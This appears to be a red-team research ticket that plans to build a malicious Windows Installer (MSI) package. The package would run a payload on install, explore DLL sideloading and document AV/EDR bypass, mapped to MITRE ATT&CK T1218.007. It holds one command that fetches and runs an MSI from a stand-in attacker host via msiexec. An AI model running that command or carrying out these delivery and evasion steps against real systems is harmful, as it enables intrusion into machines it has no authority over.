
# 📦 Research Spike: Abuse Windows Installer (MSI) for Payload Delivery

**Goal:**  
Create and deliver a malicious `.msi` Windows Installer package to execute arbitrary code. Explore both signed payload delivery and sideloading techniques.

**Why It Matters:**  
MSIs are widely used and often trusted in enterprise environments. They provide a stealthy path for execution, privilege escalation, and persistence when abused creatively.

---

### 🔍 Scope
- Test systems with Windows 10/11
- MSI packaging tools (WiX, Visual Studio, Orca)
- Optional: Signed test certs or EV signatures

---

### ✅ Tasks
- [ ] Create a minimal MSI package that:
  - Executes a command/script on install
  - Drops a payload to disk or runs in-memory
- [ ] Test execution on a target system
- [ ] Optional: Explore `msiexec.exe` LOLBin abuse
  - `msiexec /i http://attacker.com/payload.msi`
- [ ] Test sideloading:
  - DLL loaded from same directory as MSI
  - Altered path or autorun from within `InstallUtil` or `CustomAction`
- [ ] Document any AV/EDR bypass techniques

---

### 🎯 Deliverables
- Functional `.msi` file with embedded payload
- Screenshots or execution output
- Write-up of signed vs unsigned delivery
- OPSEC notes: MSI warnings, UAC prompts, logging artifacts

---

### 📚 Reference Materials
- WiX Toolset: https://wixtoolset.org/  
- Orca MSI Editor: https://learn.microsoft.com/en-us/windows/win32/msi/orca-exe  
- MITRE ATT&CK:  
  - T1059.003 – Command and Scripting Interpreter: Windows Command Shell  
  - T1218.007 – MSIExec

---

### 🏷️ Tags / Labels
`payload-delivery` `msi` `t1218.007` `signed-payloads` `installer-abuse`

---

### 📈 Effort Level
**Medium (M)** — requires Windows packaging knowledge and evasion testing.

---

### ✅ Acceptance Criteria
- [ ] MSI executes embedded payload on install
- [ ] Optional: MSI delivery method tested (e.g., via msiexec, download)
- [ ] Signed vs unsigned execution behavior documented
